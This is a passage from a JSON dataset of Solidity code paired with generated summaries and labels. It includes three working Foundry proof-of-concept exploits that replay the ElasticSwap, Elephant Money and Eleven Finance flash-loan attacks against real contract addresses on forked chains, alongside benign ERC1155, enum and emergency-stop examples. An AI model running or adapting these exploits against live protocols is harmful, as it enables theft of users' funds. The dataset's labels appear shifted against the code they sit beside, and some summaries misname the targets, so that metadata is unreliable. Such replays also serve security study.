bytes32 digest1 = EIP712domainSeparator.hash_typed_data_v4(structHash);\n        bytes32 digest2 = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                EIP712domainSeparator.domain_separator_v4(),\n                structHash\n            )\n        );\n        assertEq(digest1, digest2);\n    }\n}\n",
        "summary": "This is a solidity contract that tests the functionality of a smart contract that implements the EIP712 domain separator standard. The contract creates a domain separator object with a specific name, version, and chain ID using the `setUp()` function, and then tests the object's ability to generate cached and dynamic domain separator hashes using the `testCachedDomainSeparatorV4()`, `testDomainSeparatorV4()`, and `testHashTypedDataV4()` functions. Additionally, there are two more functions `testFuzzDomainSeparatorV4` and `testFuzzHashTypedDataV4` which test the domain separator object with modified inputs.",
        "id": "9d66f2c9-836d-4996-be08-aa8e615ef8eb",
        "api_seq": "ElasticSwap_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://quillaudits.medium.com/decoding-elastic-swaps-850k-exploit-quillaudits-9ceb7fcd8d1a\n// @Tx\n// https://etherscan.io/tx/0xb36486f032a450782d5d2fac118ea90a6d3b08cac3409d949c59b43bcd6dbb8f\n\ninterface ELPExchange is IERC20{\n    struct InternalBalances {\n        // x*y=k - we track these internally to compare to actual balances of the ERC20's\n        // in order to calculate the \"decay\" or the amount of balances that are not\n        // participating in the pricing curve and adding additional liquidity to swap.\n        uint256 baseTokenReserveQty; // x\n        uint256 quoteTokenReserveQty; // y\n        uint256 kLast; // as of the last add / rem liquidity event\n    }\n\n    function internalBalances() view external  returns(InternalBalances memory);\n    function addLiquidity(\n        uint256 _baseTokenQtyDesired,\n        uint256 _quoteTokenQtyDesired,\n        uint256 _baseTokenQtyMin,\n        uint256 _quoteTokenQtyMin,\n        address _liquidityTokenRecipient,\n        uint256 _expirationTimestamp\n    ) external;\n    function removeLiquidity(\n        uint256 _liquidityTokenQty,\n        uint256 _baseTokenQtyMin,\n        uint256 _quoteTokenQtyMin,\n        address _tokenRecipient,\n        uint256 _expirationTimestamp\n    ) external;\n    function swapQuoteTokenForBaseToken(\n        uint256 _quoteTokenQty,\n        uint256 _minBaseTokenQty,\n        uint256 _expirationTimestamp\n    ) external;\n}\n\ncontract ContractTest is DSTest{\n    IERC20 TIC = IERC20(0x75739a693459f33B1FBcC02099eea3eBCF150cBe);\n    IERC20 USDC_E = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);\n    Uni_Pair_V2 SPair = Uni_Pair_V2(0x4CF9dC05c715812FeAD782DC98de0168029e05C8);\n    Uni_Pair_V2 JPair = Uni_Pair_V2(0xA389f9430876455C36478DeEa9769B7Ca4E3DDB1);\n    ELPExchange ELP = ELPExchange(0x4ae1Da57f2d6b2E9a23d07e264Aa2B3bBCaeD19A);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 23563709);\n    }\n\n    function testExploit() public{\n        TIC.approve(address(ELP), type(uint).max);\n        USDC_E.approve(address(ELP), type(uint).max);\n        ELP.approve(address(ELP), type(uint).max);\n        SPair.swap(51_112 * 1e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"Attacker USDC.E balance after exploit\", USDC_E.balanceOf(address(this)), USDC_E.decimals());\n        emit log_named_decimal_uint(\"Attacker TIC balance after exploit\", TIC.balanceOf(address(this)), TIC.decimals());\n    }\n\n    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external{\n        JPair.swap(766_685 * 1e6, 0, address(this), new bytes(1));\n        TIC.transfer(address(SPair), 51_624 * 1e18);\n    }\n\n    function joeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external{\n        uint TICAmount = TIC.balanceOf(address(ELP));\n        uint USDC_EAmount = USDC_E.balanceOf(address(ELP));\n        uint _expirationTimestamp = 1_000_000_000_000;\n        ELP.addLiquidity(1e9, 0, 0, 0, address(this), _expirationTimestamp);\n        ELP.addLiquidity(TICAmount, USDC_EAmount, 0, 0, address(this), _expirationTimestamp);\n        USDC_E.transfer(address(ELP), USDC_E.balanceOf(address(ELP)));\n        ELP.removeLiquidity(ELP.balanceOf(address(this)), 1, 1, address(this), _expirationTimestamp);\n        // USDC.E swap to TIC\n        ELPExchange.InternalBalances memory InternalBalance = ELP.internalBalances();\n        uint USDC_EReserve = InternalBalance.quoteTokenReserveQty;\n        ELP.swapQuoteTokenForBaseToken(USDC_EReserve * 100, 1, _expirationTimestamp);\n        TICAmount = TIC.balanceOf(address(this));\n        USDC_EAmount = USDC_E.balanceOf(address(this));\n        // TIC swap to USDC.e\n        ELP.addLiquidity(TICAmount, USDC_EAmount, 0, 0, address(this),_expirationTimestamp);\n        ELP.removeLiquidity(ELP.balanceOf(address(this)), 1, 1, address(this), _expirationTimestamp);\n        USDC_E.transfer(address(JPair), 774_353 * 1e6);\n    }\n}",
        "summary": "This code is a Solidity smart contract that tests an exploit of a vulnerability in the ElasticDAO protocol. The contract interacts with various ERC20 and Uniswap contracts and interfaces with the ElasticDAO smart contract, using various functions like addLiquidity(), swapQuoteTokenForBaseToken(), and removeLiquidity(). The goal of the exploit is to manipulate the price of a token and execute a profitable trade. The code also includes some logging and testing functions for analyzing the results of the exploit.",
        "id": "046416e7-d986-4d74-a8fc-7de88e93abc2",
        "api_seq": "Elephant_Money_poc"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n//Credit: W2Ning\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n\n  address public BUSD_USDT_Pair = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;\n\n  address public elephant_wbnb_Pair =\n    0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1;\n\n  address public BUSDT_WBNB_Pair = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;\n\n  address[] path_1 = [\n    0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,\n    0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688\n  ];\n\n  address[] path_2 = [\n    0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688,\n    0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c\n  ];\n\n  address[] path_3 = [\n    0xdd325C38b12903B727D16961e61333f4871A70E0,\n    0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56\n  ];\n\n  address[] path_4 = [\n    0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c,\n    0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56\n  ];\n\n  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);\n\n  IERC20 elephant = IERC20(0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688);\n\n  IERC20 Trunk = IERC20(0xdd325C38b12903B727D16961e61333f4871A70E0);\n\n  IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n\n  InotVerified not_verified =\n    InotVerified(0xD520a3B47E42a1063617A9b6273B206a07bDf834);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  constructor() {\n    cheats.createSelectFork(\"bsc\", 16886438); // fork bsc block number 16886438\n\n    elephant.approve(address(router), type(uint256).max);\n\n    Trunk.approve(address(router), type(uint256).max);\n\n    Trunk.approve(address(not_verified), type(uint256).max);\n\n    busd.approve(address(not_verified), type(uint256).max);\n\n    wbnb.approve(address(router), type(uint256).max);\n  }\n\n  function testExploit() public {\n    IPancakePair(BUSDT_WBNB_Pair).swap(0, 100000 ether, address(this), \"0x00\");\n  }\n\n  function pancakeCall(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n  ) external {\n    sender;\n    data;\n    amount0;\n    amount1;\n\n    if (msg.sender == BUSDT_WBNB_Pair) {\n      IPancakePair(BUSD_USDT_Pair).swap(\n        0,\n        90000000 ether,\n        address(this),\n        \"0x00\"\n      );\n    } else {\n      attack();\n    }\n  }\n\n  function attack() public {\n    wbnb.withdraw(100000 ether);\n\n    router.swapExactETHForTokensSupportingFeeOnTransferTokens{\n      value: 100000 ether\n    }(0, path_1, address(this), block.timestamp);\n\n    uint256 balance_elephant = elephant.balanceOf(address(this));\n\n    emit log_named_uint(\"The elephant after swapping\", balance_elephant / 1e9);\n\n    not_verified.mint(90000000 ether);\n\n    uint256 balance_Trunk = Trunk.balanceOf(address(this));\n\n    emit log_named_uint(\"The Trunk after minting\", balance_Trunk / 1e18);\n\n    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n      balance_elephant,\n      0,\n      path_2,\n      address(this),\n      block.timestamp\n    );\n\n    emit log_named_uint(\n      \"The WBNB Balance after swaping\",\n      wbnb.balanceOf(address(this)) / 1e18\n    );\n\n    balance_Trunk = Trunk.balanceOf(address(this));\n\n    not_verified.redeem(balance_Trunk);\n\n    emit log_named_uint(\n      \"The BUSD after redeeming\",\n      busd.balanceOf(address(this)) / 1e18\n    );\n\n    uint256 b3 = elephant.balanceOf(address(this));\n\n    emit log_named_uint(\"The elephant after redeeming\", b3 / 1e9);\n\n    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n      b3,\n      0,\n      path_2,\n      address(this),\n      block.timestamp\n    );\n\n    emit log_named_uint(\n      \"The WBNB Balance before paying back\",\n      wbnb.balanceOf(address(this)) / 1e18\n    );\n\n    wbnb.transfer(BUSDT_WBNB_Pair, 100300 ether);\n\n    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n      wbnb.balanceOf(address(this)),\n      0,\n      path_4,\n      address(this),\n      block.timestamp\n    );\n\n    emit log_named_uint(\n      \"The BUSD before paying back\",\n      busd.balanceOf(address(this)) / 1e18\n    );\n\n    busd.transfer(BUSD_USDT_Pair, 90300000 ether);\n\n    emit log_named_uint(\n      \"The BUSD after paying back\",\n      busd.balanceOf(address(this)) / 1e18\n    );\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This code is a Solidity smart contract that contains a test function for exploiting a vulnerability in a PancakeSwap trading pair. The contract imports various other contracts and interfaces, sets up addresses for different trading pairs and ERC20 tokens, and approves token spending for certain contracts. The main function `testExploit()` calls a swap function on a specific PancakeSwap pair which triggers the `pancakeCall()` function. This function then performs a series of token swaps and mint/redeem functions in order to manipulate the token balances and withdraw funds from the PancakeSwap pair. Ultimately, the attacker aims to pay back the borrowed funds and retain a profit. This code should not be used for malicious purposes and is only for educational purposes.",
        "id": "52615819-7e66-4da9-926b-a0ff623973d3",
        "api_seq": "Eleven"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n//Credit: Cache_And_Burn\n\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nEleven Finance Exploit POC\n\ntx hash: 0x6450d8f4db09972853e948bee44f2cb54b9df786dace774106cd28820e906789\n\nhttps://peckshield.medium.com/eleven-finance-incident-root-cause-analysis-123b5675fa76\n*/\n\ncontract Eleven is DSTest {\n\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n\n  IPancakePair cake_LP = IPancakePair(0x401479091d0F7b8AE437Ee8B054575cd33ea72Bd);\n\n  IERC20 nrv = IERC20(0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096);\n\n  IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); \n\n  IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n\n  address public ape_lp = 0x51e6D27FA57373d8d4C256231241053a70Cb1d93;\n\n  IElevenNeverSellVault vault = IElevenNeverSellVault(0x27DD6E51BF715cFc0e2fe96Af26fC9DED89e4BE8);\n\n  //Path from BUSD --> NRV\n  address[] path_1 = [\n    0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56,\n    0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096\n  ];\n\n  //Path from NRV --> BUSD\n  address[] path_2 = [\n    0x42F6f551ae042cBe50C739158b4f0CAC0Edb9096,\n    0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56\n  ];\n\n  function setUp() public {\n    // fork bsc block number 8530973\n    cheats.createSelectFork(\"bsc\", 8530973); \n\n    busd.approve(address(router), type(uint256).max);\n\n    busd.approve(ape_lp, type(uint256).max);\n\n    nrv.approve(address(router), type(uint256).max);\n\n    cake_LP.approve(address(vault), type(uint256).max);\n\n    cake_LP.approve(address(router), type(uint256).max);\n  }\n\n  function testExploit() public {\n    console.log(\"-------Start exploit-------\");\n\n    console.log(\"attacker BUSD balance before is\", busd.balanceOf(address(this)));\n\n    cheats.startPrank(0xc71e2F581b77De945C8A7A191b0B238c81f11eD6);\n    \n    //Take a flashloan from apeswap\n    IPancakePair(ape_lp).swap(\n      0, \n      953869628210538003222368, \n      address(this), \n      \"Gimme da loot\"\n    );\n  }\n\n  function pancakeCall(\n    address sender,\n    uint256 amount0,\n    uint256 amount1,\n    bytes calldata data\n  ) external {\n\n    attack();\n    \n  }\n\n  function attack() public {\n\n    console.log(\"received BUSD flashloan for\", busd.balanceOf(address(this)) / 1 ether );\n\n    //Swap BUSD for NRV\n    router.swapExactTokensForTokens(\n      340631231201021740166440,\n      474378756062092796179091,\n      path_1,\n      address(this),\n      block.timestamp + 500 seconds\n    );\n\n    //Add liquidity to pancakeSwap and receive LP tokens\n    router.addLiquidity(\n      address(nrv),\n      address(busd),\n      474378756062092796179091,\n      366962025372860720681305,\n      474378756062092796179091,\n      366962025372860720681305,\n      address(this),\n      block.timestamp + 500 seconds\n    );\n\n    //Deposit LP tokens into Eleven vault\n    vault.depositAll();\n\n    //Call emergency Burn\n    vault.emergencyBurn();\n\n    //withdraw from vault\n    vault.withdrawAll();\n\n    //remove liquidity from pancakeSwap\n    router.removeLiquidity(\n      address(nrv),\n      address(busd),\n      823030594158097624422918,\n      449328228768287545012441,\n      347583855261065794904977,\n      address(this),\n      block.timestamp + 500 seconds\n    );\n\n    //swap NRV for BUSD\n    router.swapExactTokensForTokens(\n      948757512124185592358179,\n      624113299151540843640146,\n      path_2,\n      address(this),\n      block.timestamp + 500 seconds\n    );\n\n    //repay flashloan\n    busd.transfer(ape_lp, 956739847753799401426648);\n\n    console.log(\"-------Finish exploit-------\");\n\n    console.log(\"attacker BUSD balance after is\", busd.balanceOf(address(this)) / 1 ether );\n    }\n}\n",
        "summary": "This code is a smart contract in Solidity language. It exploits a vulnerability in the Eleven Finance platform that was causing the platform to lose funds due to manipulation of a smart contract function. The exploit involves taking a flash loan from a platform called ApeSwap, swapping BUSD for NRV (another token), adding liquidity to PancakeSwap, depositing LP tokens in an Eleven Finance vault, performing an emergency burn function to receive tokens at a discounted rate, withdrawing LP tokens, removing liquidity from PancakeSwap to receive NRV, swapping NRV for BUSD, and finally repaying the flash loan. It initializes several contracts and executes several functions such as approve, swapExactTokensForTokens, addLiquidity, depositAll, emergencyBurn, withdrawAll, removeLiquidity, and transfer.",
        "id": "0cf5b3c7-70ea-4ea7-82f8-0689ad5f836e",
        "api_seq": "EmergencyStop"
    },
    {
        "code": "// This code has not been professionally audited, therefore I cannot make any promises about\n// safety or correctness. Use at own risk.\n\npragma solidity ^0.4.21;\n\ncontract EmergencyStop {\n\n    bool isStopped = false;\n\n    modifier stoppedInEmergency {\n        require(!isStopped);\n        _;\n    }\n\n    modifier onlyWhenStopped {\n        require(isStopped);\n        _;\n    }\n\n    modifier onlyAuthorized {\n        // Check for authorization of msg.sender here\n        _;\n    }\n\n    function stopContract() public onlyAuthorized {\n        isStopped = true;\n    }\n\n    function resumeContract() public onlyAuthorized {\n        isStopped = false;\n    }\n\n    function deposit() public payable stoppedInEmergency {\n        // Deposit logic happening here\n    }\n\n    function emergencyWithdraw() public onlyWhenStopped {\n        // Emergency withdraw happening here\n    }\n}\n",
        "summary": "This code defines a smart contract called \"EmergencyStop\" that allows authorized users to stop and resume the contract. If the contract is stopped, it prevents users from depositing funds but allows them to withdraw in emergency situations. The contract contains four main functions: `stopContract`, `resumeContract`, `deposit`, and `emergencyWithdraw`. `stopContract` and `resumeContract` change the state of `isStopped` variable, which controls whether or not users can deposit funds. `emergencyWithdraw` allows users to withdraw funds if the contract is stopped, and `deposit` allows users to deposit funds only if the contract is not stopped (i.e., in normal operating conditions). The contract contains three modifiers: `stoppedInEmergency`, `onlyWhenStopped`, and `onlyAuthorized`, which are used to check certain conditions before allowing execution of the function.",
        "id": "da1e4486-f6c0-4c13-8dfc-122ec35058de",
        "api_seq": "Enum"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  enum MyEnum {\n    Foo,\n    Bar,\n    Qux\n  }\n\n  function MyContract() {\n    assert(uint(MyEnum.Foo) == 0);\n    assert(uint(MyEnum.Bar) == 1);\n    assert(uint(MyEnum.Qux) == 2);\n  }\n}\n",
        "summary": "This is a smart contract written in Solidity. It defines an enum `MyEnum` with three values: `Foo`, `Bar`, and `Qux`. The constructor function contains assertions that check if the values of `Foo`, `Bar`, and `Qux` are mapped to 0, 1, and 2 respectively. The constructor runs when the contract is deployed to the Ethereum blockchain network.",
        "id": "4e114865-c2b8-4557-bccc-cd4da3e43220",
        "api_seq": "ERC1155"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"./IERC1155.sol\";\nimport \"./IERC1155Receiver.sol\";\nimport \"./IERC1155MetadataURI.sol\";\nimport \"../34_ERC721/Address.sol\";\nimport \"../34_ERC721/String.sol\";\nimport \"../34_ERC721/IERC165.sol\";\n\n/**\n * @dev ERC1155\u591a\u4ee3\u5e01\u6807\u51c6\n * \u89c1 https://eips.ethereum.org/EIPS/eip-1155\n */\ncontract ERC1155 is IERC165, IERC1155, IERC1155MetadataURI {\n    using Address for address; // \u4f7f\u7528Address\u5e93\uff0c\u7528isContract\u6765\u5224\u65ad\u5730\u5740\u662f\u5426\u4e3a\u5408\u7ea6\n    using Strings for uint256; // \u4f7f\u7528String\u5e93\n    // Token\u540d\u79f0\n    string public name;\n    // Token\u4ee3\u53f7\n    string public symbol;\n    // \u4ee3\u5e01\u79cd\u7c7bid \u5230 \u8d26\u6237account \u5230 \u4f59\u989dbalances \u7684\u6620\u5c04\n    mapping(uint256 => mapping(address => uint256)) private _balances;\n    // \u53d1\u8d77\u65b9\u5730\u5740address \u5230 \u6388\u6743\u5730\u5740operator \u5230 \u662f\u5426\u6388\u6743bool \u7684\u6279\u91cf\u6388\u6743\u6620\u5c04\n    mapping(address => mapping(address => bool)) private _operatorApprovals;\n\n    /**\n     * \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316`name` \u548c`symbol`, uri_\n     */\n    constructor(string memory name_, string memory symbol_) {\n        name = name_;\n        symbol = symbol_;\n    }\n\n    /**\n     * @dev See {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\n        return\n            interfaceId == type(IERC1155).interfaceId ||\n            interfaceId == type(IERC1155MetadataURI).interfaceId ||\n            interfaceId == type(IERC165).interfaceId;\n    }\n\n    /**\n     * @dev \u6301\u4ed3\u67e5\u8be2 \u5b9e\u73b0IERC1155\u7684balanceOf\uff0c\u8fd4\u56deaccount\u5730\u5740\u7684id\u79cd\u7c7b\u4ee3\u5e01\u6301\u4ed3\u91cf\u3002\n     */\n    function balanceOf(address account, uint256 id) public view virtual override returns (uint256) {\n        require(account != address(0), \"ERC1155: address zero is not a valid owner\");\n        return _balances[id][account];\n    }\n\n    /**\n     * @dev \u6279\u91cf\u6301\u4ed3\u67e5\u8be2\n     * \u8981\u6c42:\n     * - `accounts` \u548c `ids` \u6570\u7ec4\u957f\u5ea6\u76f8\u7b49.\n     */\n    function balanceOfBatch(address[] memory accounts, uint256[] memory ids)\n        public view virtual override\n        returns (uint256[] memory)\n    {\n        require(accounts.length == ids.length, \"ERC1155: accounts and ids length mismatch\");\n        uint256[] memory batchBalances = new uint256[](accounts.length);\n        for (uint256 i = 0; i < accounts.length; ++i) {\n            batchBalances[i] = balanceOf(accounts[i], ids[i]);\n        }\n        return batchBalances;\n    }\n\n    /**\n     * @dev \u6279\u91cf\u6388\u6743\uff0c\u8c03\u7528\u8005\u6388\u6743operator\u4f7f\u7528\u5176\u6240\u6709\u4ee3\u5e01\n     * \u91ca\u653e{ApprovalForAll}\u4e8b\u4ef6\n     * \u6761\u4ef6\uff1amsg.sender != operator\n     */\n    function setApprovalForAll(address operator, bool approved) public virtual override {\n        require(msg.sender != operator, \"ERC1155: setting approval status for self\");\n        _operatorApprovals[msg.sender][operator] = approved;\n        emit ApprovalForAll(msg.sender, operator, approved);\n    }\n\n    /**\n     * @dev \u67e5\u8be2\u6279\u91cf\u6388\u6743.\n     */\n    function isApprovedForAll(address account, address operator) public view virtual override returns (bool) {\n        return _operatorApprovals[account][operator];\n    }\n\n    /**\n     * @dev \u5b89\u5168\u8f6c\u8d26\uff0c\u5c06`amount`\u5355\u4f4d\u7684`id`\u79cd\u7c7b\u4ee3\u5e01\u4ece`from`\u8f6c\u8d26\u5230`to`\n     * \u91ca\u653e {TransferSingle} \u4e8b\u4ef6.\n     * \u8981\u6c42:\n     * - to \u4e0d\u80fd\u662f0\u5730\u5740.\n     * - from\u62e5\u6709\u8db3\u591f\u7684\u6301\u4ed3\u91cf\uff0c\u4e14\u8c03\u7528\u8005\u62e5\u6709\u6388\u6743\n     * - \u5982\u679c to \u662f\u667a\u80fd\u5408\u7ea6, \u4ed6\u5fc5\u987b\u652f\u6301 IERC1155Receiver-onERC1155Received.\n     */\n    function safeTransferFrom(\n        address from,\n        address to,\n        uint256 id,\n        uint256 amount,\n        bytes memory data\n    ) public virtual override {\n        address operator = msg.sender;\n        // \u8c03\u7528\u8005\u662f\u6301\u6709\u8005\u6216\u662f\u88ab\u6388\u6743\n        require(\n            from == operator || isApprovedForAll(from, operator),\n            \"ERC1155: caller is not token owner nor approved\"\n        );\n        require(to != address(0), \"ERC1155: transfer to the zero address\");\n        // from\u5730\u5740\u6709\u8db3\u591f\u6301\u4ed3\n        uint256 fromBalance = _balances[id][from];\n        require(fromBalance >= amount, \"ERC1155: insufficient balance for transfer\");\n        // \u66f4\u65b0\u6301\u4ed3\u91cf\n        unchecked {\n            _balances[id][from] = fromBalance - amount;\n        }\n        _balances[id][to] += amount;\n        // \u91ca\u653e\u4e8b\u4ef6\n        emit TransferSingle(operator, from, to, id, amount);\n        // \u5b89\u5168\u68c0\u67e5\n        _doSafeTransferAcceptanceCheck(operator, from, to, id, amount, data);    \n    }\n\n    /**\n     * @dev \u6279\u91cf\u5b89\u5168\u8f6c\u8d26\uff0c\u5c06`amounts`\u6570\u7ec4\u5355\u4f4d\u7684`ids`\u6570\u7ec4\u79cd\u7c7b\u4ee3\u5e01\u4ece`from`\u8f6c\u8d26\u5230`to`\n     * \u91ca\u653e {TransferSingle} \u4e8b\u4ef6.\n     * \u8981\u6c42:\n     * - to \u4e0d\u80fd\u662f0\u5730\u5740.\n     * - from\u62e5\u6709\u8db3\u591f\u7684\u6301\u4ed3\u91cf\uff0c\u4e14\u8c03\u7528\u8005\u62e5\u6709\u6388\u6743\n     * - \u5982\u679c to \u662f\u667a\u80fd\u5408\u7ea6, \u4ed6\u5fc5\u987b\u652f\u6301 IERC1155Receiver-onERC1155BatchReceived.\n     * - ids\u548camounts\u6570\u7ec4\u957f\u5ea6\u76f8\u7b49\n     */\n    function safeBatchTransferFrom(\n        address from,\n        address to,\n        uint256[] memory ids,\n        uint256[] memory amounts,\n        bytes memory data\n    ) public virtual override {\n        address operator = msg.sender;\n        // \u8c03\u7528\u8005\u662f\u6301\u6709\u8005\u6216\u662f\u88ab\u6388\u6743\n        require(\n            from == operator || isApprovedForAll(from, operator),\n            \"ERC1155: caller is not token owner nor approved\"\n        );\n        require(ids.length == amounts.length, \"ERC1155: ids and amounts length mismatch\");\n        require(to != address(0), \"ERC1155: transfer to the zero address\");\n\n        // \u901a\u8fc7for\u5faa\u73af\u66f4\u65b0\u6301\u4ed3  \n        for (uint256 i = 0; i < ids.length; ++i) {\n            uint256 id = ids[i];\n            uint256 amount = amounts[i];\n\n            uint256 fromBalance = _balances[id][from];\n            require(fromBalance >= amount, \"ERC1155: insufficient balance for transfer\");\n            unchecked {\n                _balances[id][from] = fromBalance - amount;\n            }\n            _balances[id][to] += amount;\n        }\n\n        emit TransferBatch(operator, from, to, ids, amounts);\n        // \u5b89\u5168\u68c0\u67e5\n        _doSafeBatchTransferAcceptanceCheck(operator, from, to, ids, amounts, data);    \n    }\n\n    /**\n     * @dev \u94f8\u9020\n     * \u91ca\u653e {TransferSingle} \u4e8b\u4ef6.\n     */\n    function _mint(\n        address to,\n        uint256 id,\n        uint256 amount,\n        bytes memory data\n    ) internal virtual {\n        require(to != address(0), \"ERC1155: mint to the zero address\");\n\n        address operator = msg.sender;\n\n        _balances[id][to] += amount;\n        emit TransferSingle(operator, address(0), to, id, amount);\n\n        _doSafeTransferAcceptanceCheck(operator, address(0), to, id, amount, data);\n    }\n\n    /**\n     * @dev \u6279\u91cf\u94f8\u9020\n     * \u91ca\u653e {TransferBatch} \u4e8b\u4ef6.\n     */\n    function _mintBatch(\n        address to,\n        uint256[] memory ids,\n        uint256[] memory amounts,\n        bytes memory data\n    ) internal virtual {\n        require(to != address(0), \"ERC1155: mint to the zero address\");\n        require(ids.length == amounts.length, \"ERC1155: ids and amounts length mismatch\");\n\n        address operator = msg.sender;\n\n        for (uint256 i = 0; i < ids.length; i++) {\n            _balances[ids[i]][to] += amounts[i];\n        }\n\n        emit TransferBatch(operator, address(0), to, ids, amounts);\n\n        _doSafeBatchTransferAcceptanceCheck(operator, address(0), to, ids, amounts, data);\n    }\n\n    /**\n     * @dev \u9500\u6bc1\n     */\n    function _burn(\n        address from,\n        uint256 id,\n        uint256 amount\n    ) internal virtual {\n        require(from != address(0), \"ERC1155: burn from the zero address\");\n\n        address operator = msg.sender;\n\n        uint256 fromBalance = _balances[id][from];\n        require(fromBalance >= amount, \"ERC1155: burn amount exceeds balance\");\n        unchecked {\n            _balances[id][from] = fromBalance - amount;\n        }\n\n        emit TransferSingle(operator, from, address(0), id, amount);\n    }\n\n    /**\n     * @dev \u6279\u91cf\u9500\u6bc1\n     */\n    function _burnBatch(\n        address from,\n        uint256[] memory ids,\n        uint256[] memory amounts\n    ) internal virtual {\n        require(from != address(0), \"ERC1155: burn from the zero address\");\n        require(ids.length == amounts.length, \"ERC1155: ids and amounts length mismatch\");\n\n        address operator = msg.sender;\n\n        for (uint256 i = 0; i < ids.length; i++) {\n            uint256 id = ids[i];\n            uint256 amount = amounts[i];\n\n            uint256 fromBalance = _balances[id][from];\n            require(fromBalance >= amount, \"ERC1155: burn amount exceeds balance\");\n            unchecked {\n                _balances[id][from] = fromBalance - amount;\n            }\n        }\n\n        emit TransferBatch(operator, from, address(0), ids, amounts);\n    }\n\n    // @dev ERC1155\u7684\u5b89\u5168\u8f6c\u8d26\u68c0\u67e5\n    function _doSafeTransferAcceptanceCheck(\n        address operator,\n        address from,\n        address to,\n        uint256 id,\n        uint256 amount,\n        bytes memory data\n    ) private {\n        if (to.isContract()) {\n            try IERC1155Receiver(to).onERC1155Received(operator, from, id, amount, data) returns (bytes4 response) {\n                if (response != IERC1155Receiver.onERC1155Received.selector) {\n                    revert(\"ERC1155: ERC1155Receiver rejected tokens\");\n                }\n            } catch Error(string memory reason) {\n                revert(reason);\n            } catch {\n                revert(\"ERC1155: transfer to non-ERC1155Receiver implementer\");\n            }\n        }\n    }\n\n    // @dev ERC1155\u7684\u6279\u91cf\u5b89\u5168\u8f6c\u8d26\u68c0\u67e5\n    function _doSafeBatchTransferAcceptanceCheck(\n        address operator,\n        address from,\n        address to,\n        uint256[] memory ids,\n        uint256[] memory amounts,\n        bytes memory data\n    ) private {\n        if (to.isContract()) {\n            try IERC1155Receiver(to).onERC1155BatchReceived(operator, from, ids, amounts, data) returns (\n                bytes4 response\n            ) {\n                if (response != IERC1155Receiver.onERC1155BatchReceived.selector) {\n                    revert(\"ERC1155: ERC1155Receiver rejected tokens\");\n                }\n            } catch Error(string memory reason) {\n                revert(reason);\n            } catch {\n                revert(\"ERC1155: transfer to non-ERC1155Receiver implementer\");\n            }\n        }\n    }\n\n    /**\n     * @dev \u8fd4\u56deERC1155\u7684id\u79cd\u7c7b\u4ee3\u5e01\u7684uri\uff0c\u5b58\u50a8metadata\uff0c\u7c7b\u4f3cERC721\u7684tokenURI.\n     */\n    function uri(uint256 id) public view virtual override returns (string memory) {\n        string memory baseURI = _baseURI();\n        return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, id.toString())) : \"\";\n    }\n\n    /**\n     * \u8ba1\u7b97{uri}\u7684BaseURI\uff0curi\u5c31\u662f\u628abaseURI\u548ctokenId\u62fc\u63a5\u5728\u4e00\u8d77\uff0c\u9700\u8981\u5f00\u53d1\u91cd\u5199.\n     */\n    function _baseURI() internal view virtual returns (string memory) {\n        return \"\";\n    }\n}\n",
